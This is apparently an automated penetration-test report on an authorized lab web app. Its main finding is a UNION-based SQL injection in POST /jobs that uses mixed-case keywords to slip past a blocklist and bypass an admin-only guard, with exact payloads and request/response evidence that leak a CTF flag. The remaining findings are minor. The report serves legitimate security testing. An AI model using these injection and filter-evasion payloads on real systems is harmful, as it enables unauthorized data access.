# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — sqli Unauthenticated UNION-based SQL injection in POST /jobs (job_type) bypasses admin-only guard, leaks private records](#finding-1)
    - [2. LOW — info-disclosure Swagger UI and OpenAPI spec publicly accessible without authentication](#finding-2)
    - [3. LOW — info-disclosure OpenAPI JSON spec publicly accessible, exposes full API surface and no security schemes](#finding-3)
    - [4. INFO — headers Missing security response headers on /docs (no CSP, X-Frame-Options, HSTS)](#finding-4)
    - [5. INFO — burp OpenAPI definition found (active scan check)](#finding-5)
    - [6. INFO — burp DOM data manipulation (DOM-based)](#finding-6)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqxd0rp1-wqiar6` |
| Target | http://target.local:8000/ |
| Started | 2026-06-28T05:40:05.778Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 3 mapped · 3 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 6 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:8000`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

6 finding(s): 1 critical, 2 low, 3 info

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [sqli] Unauthenticated UNION-based SQL injection in POST /jobs (job_type) bypasses admin-only guard, leaks private records

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8000/

The `job_type` field of the JSON body sent to POST /jobs is concatenated directly into a SQL query (SQLite): SELECT id,name,type,description FROM jobs WHERE type = '<job_type>'. A lone single quote returns HTTP 500 (broken syntax), proving string concatenation. The endpoint is fully unauthenticated.

The app layers two weak protections, both bypassable:
1. A business-logic access-control guard: requesting job_type="private" returns 403 "Only admins can see private jobs", and any query whose result set contains the private row (id 3) returns 500 (a post-query guard that throws on private-typed rows).
2. A naive, CASE-SENSITIVE SQL keyword blocklist: uppercase OR/AND/UNION/ORDER cause 500, but mixed-case variants (oR, UnIoN, SeLeCt, FrOm, WhErE) pass straight through. Confirmed: `back-end' oR 1=2-- ` returns only the back-end row (the OR is genuinely evaluated), and `back-end' oRdEr bY 4-- `=200 while `bY 5-- `=500 reveals a 4-column table.

Chaining these: a case-varied UNION SELECT that masks the type (and id) columns defeats both the keyword filter AND the private-row guard, exfiltrating the protected admin-only job record. Payload: job_type = `nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- ` returns the hidden record {name:"Hidden job", description:"flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"}. The same primitive allows extraction of arbitrary data from any table in the database.

Impact: unauthenticated attacker reads arbitrary database contents and bypasses the application's only authorization control. Direct sensitive-data exposure (the protected record / secret).

**Reproduction**

```
1. Baseline (guard active): POST /jobs {"job_type":"private"} -> 403 "Only admins can see private jobs" (ev-mqxdjpac-1j). The private record is not accessible legitimately.
2. Confirm concatenation: POST /jobs {"job_type":"'"} -> 500 (syntax break); {"job_type":"back-end' -- "} -> 200 returning only id 2 (the trailing quote is commented out = injection structurally sound).
3. Confirm filter is case-sensitive: {"job_type":"back-end' oR 1=2-- "} -> 200 (id 2 only); {"job_type":"back-end' oRdEr bY 4-- "} -> 200, {"...bY 5-- "} -> 500 (4 columns).
4. Exploit (bug present): POST /jobs {"job_type":"nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- "} -> 200 returning {"id":999,"name":"Hidden job","description":"flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"}. Reproduced identically on replay (ev-mqxdqalb-26, ev-mqxdqs6r-27, ev-mqxdqt38-28).
```

**Evidence**

- Evidence `ev-mqxdjpac-1j` — `artifacts/_/ev-mqxdjpac-1j/`

Request:

```http
POST /jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json

{"job_type":"private"}
```

Response:

```http
HTTP/1.1 403
content-length: 46
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:54:48 GMT
server: uvicorn

{"detail": "Only admins can see private jobs"}
```

- Evidence `ev-mqxdqalb-26` — `artifacts/_/ev-mqxdqalb-26/`

Request:

```http
POST /jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json

{"job_type":"nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- "}
```

Response:

```http
HTTP/1.1 200
content-length: 109
content-type: application/json
date: Sun, 28 Jun 2026 05:59:56 GMT
server: uvicorn

[{"id":999,"name":"Hidden job","type":"back-end","description":"flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"}]
```

- Evidence `ev-mqxdqs6r-27` — `artifacts/_/ev-mqxdqs6r-27/`

Request:

```http
POST /jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json

{"job_type":"nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- "}
```

Response:

```http
HTTP/1.1 200
content-length: 109
content-type: application/json
date: Sun, 28 Jun 2026 06:00:18 GMT
server: uvicorn

[{"id":999,"name":"Hidden job","type":"back-end","description":"flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"}]
```

- Evidence `ev-mqxdqt38-28` — `artifacts/_/ev-mqxdqt38-28/`

Request:

```http
POST /jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json

{"job_type":"nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- "}
```

Response:

```http
HTTP/1.1 200
content-length: 109
content-type: application/json
date: Sun, 28 Jun 2026 06:00:19 GMT
server: uvicorn

[{"id":999,"name":"Hidden job","type":"back-end","description":"flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"}]
```

<a id="finding-2"></a>

### 2. [LOW] [info-disclosure] Swagger UI and OpenAPI spec publicly accessible without authentication

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8000/

The FastAPI Swagger UI at /docs and the machine-readable OpenAPI spec at /openapi.json are served to unauthenticated clients with HTTP 200. The spec enumerates all endpoints (/jobs POST, /ping GET, / GET) with no securitySchemes defined, meaning any external party can fully map the API surface without credentials. The /jobs endpoint in particular accepts POST requests with no declared authentication requirement.

**Reproduction**

```
1. Without any credentials or session, send GET http://target.local:8000/openapi.json\n2. Observe HTTP 200 with the complete API specification (endpoints, operations, schemas).\n3. Repeat: response is stable and identical both times.\n4. Negative control: GET /admin returns 404 — shows not every path is open, but /docs and /openapi.json have no access control at all.
```

**Evidence**

- Evidence `ev-mqxdajcd-y` — `artifacts/s-0002/ev-mqxdajcd-y/`

Request:

```http
GET /admin HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 22
content-type: application/json
date: Sun, 28 Jun 2026 05:47:40 GMT
server: uvicorn

{"detail":"Not Found"}
```

- Evidence `ev-mqxd9tmf-u` — `artifacts/s-0002/ev-mqxd9tmf-u/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 590
content-type: application/json
date: Sun, 28 Jun 2026 05:47:07 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/jobs":{"post":{"summary":"Jobs","operationId":"jobs_jobs_post","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/":{"get":{"summary":"Read Root","operationId":"read_root__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}}}}}
```

- Evidence `ev-mqxdahyz-w` — `artifacts/s-0002/ev-mqxdahyz-w/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 590
content-type: application/json
date: Sun, 28 Jun 2026 05:47:38 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/jobs":{"post":{"summary":"Jobs","operationId":"jobs_jobs_post","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/":{"get":{"summary":"Read Root","operationId":"read_root__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}}}}}
```

<a id="finding-3"></a>

### 3. [LOW] [info-disclosure] OpenAPI JSON spec publicly accessible, exposes full API surface and no security schemes

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8000/

The machine-readable OpenAPI 3.1 specification is served without any authentication requirement. It discloses: (1) all three API paths — POST /jobs, GET /ping, GET / — including /jobs which is not prominently linked in the UI; (2) zero security scheme definitions, confirming the entire API has no documented authentication layer; (3) the underlying framework and version (FastAPI 0.1.0). Any unauthenticated actor can programmatically enumerate all operations and their schemas. The CORS probe returned no Access-Control-Allow-Origin header, so the JSON cannot be fetched cross-site directly, but the spec is fully readable via direct browser or curl without credentials.

**Reproduction**

```
1. Send GET http://target.local:8000/openapi.json with no session cookie or Authorization header.
2. Server returns HTTP 200 with the full OpenAPI 3.1 JSON.
3. Parse paths — /jobs (POST, no security scheme), /ping (GET), / (GET) are all disclosed.
4. Note absence of any "securitySchemes" or "security" object — confirms no auth layer is defined.
```

**Evidence**

- Evidence `ev-mqxderup-12` — `artifacts/s-0003/ev-mqxderup-12/`

Request:

```http
GET /openapi.yaml HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 404
content-length: 22
content-type: application/json
date: Sun, 28 Jun 2026 05:50:58 GMT
server: uvicorn

{"detail":"Not Found"}
```

- Evidence `ev-mqxdcu2b-z` — `artifacts/s-0003/ev-mqxdcu2b-z/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 590
content-type: application/json
date: Sun, 28 Jun 2026 05:49:27 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/jobs":{"post":{"summary":"Jobs","operationId":"jobs_jobs_post","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/":{"get":{"summary":"Read Root","operationId":"read_root__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}}}}}
```

- Evidence `ev-mqxdequ4-11` — `artifacts/s-0003/ev-mqxdequ4-11/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 590
content-type: application/json
date: Sun, 28 Jun 2026 05:50:57 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/jobs":{"post":{"summary":"Jobs","operationId":"jobs_jobs_post","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/":{"get":{"summary":"Read Root","operationId":"read_root__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}}}}}
```

<a id="finding-4"></a>

### 4. [INFO] [headers] Missing security response headers on /docs (no CSP, X-Frame-Options, HSTS)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8000/

GET /docs returns only a Content-Type header. The following security headers are absent: Content-Security-Policy (XSS/injection control), X-Frame-Options (clickjacking), Strict-Transport-Security (HSTS), and X-Content-Type-Options. The same omission applies to /openapi.json. The Swagger UI loads third-party JS from cdn.jsdelivr.net without a hash or SRI attribute, which CSP would normally restrict.

**Reproduction**

```
1. GET http://target.local:8000/docs\n2. Inspect response headers — only Content-Type: text/html; charset=utf-8 is present.\n3. No Content-Security-Policy, X-Frame-Options, Strict-Transport-Security, or X-Content-Type-Options headers appear.\n4. Repeat: consistent across both requests.\n5. Negative control: /admin returns 404 with application/json only — a distinct status/body confirming the /docs responses are the target surface.
```

**Evidence**

- Evidence `ev-mqxdajcd-y` — `artifacts/s-0002/ev-mqxdajcd-y/`

Request:

```http
GET /admin HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 22
content-type: application/json
date: Sun, 28 Jun 2026 05:47:40 GMT
server: uvicorn

{"detail":"Not Found"}
```

- Evidence `ev-mqxd9u1n-v` — `artifacts/s-0002/ev-mqxd9u1n-v/`

Request:

```http
GET /docs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 931
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:47:08 GMT
server: uvicorn


    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>FastAPI - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,
oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

- Evidence `ev-mqxdaite-x` — `artifacts/s-0002/ev-mqxdaite-x/`

Request:

```http
GET /docs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 931
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:47:40 GMT
server: uvicorn


    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>FastAPI - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,
oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

<a id="finding-5"></a>

### 5. [INFO] [burp] OpenAPI definition found (active scan check)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) @ http://target.local:8000/openapi.json

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqxdygya-2f` — `artifacts/_/ev-mqxdygya-2f/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:8000

GET /openapi.json HTTP/1.1
Host: target.local:8000
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="146", "Not;A=Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
date: Sun, 28 Jun 2026 06:02:26 GMT
server: uvicorn
content-length: 590
content-type: application/json
connection: close

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/jobs":{"post":{"summary":"Jobs","operationId":"jobs_jobs_post","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/":{"get":{"summary":"Read Root","operationId":"read_root__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}}}}}
```

<a id="finding-6"></a>

### 6. [INFO] [burp] DOM data manipulation (DOM-based)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application may be vulnerable to DOM-based DOM data manipulation. Data is read from <b>location.hash</b> and passed to <b>history.pushState</b>. (confidence: FIRM) @ http://target.local:8000/docs

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqxdygyg-2g` — `artifacts/_/ev-mqxdygyg-2g/`

Request:

```http
GET /docs HTTP/1.1
Host: target.local:8000

GET /docs HTTP/1.1
Host: target.local:8000
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
date: Sun, 28 Jun 2026 06:02:26 GMT
server: uvicorn
content-length: 931
content-type: text/html; charset=utf-8


    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>FastAPI - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,
oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```
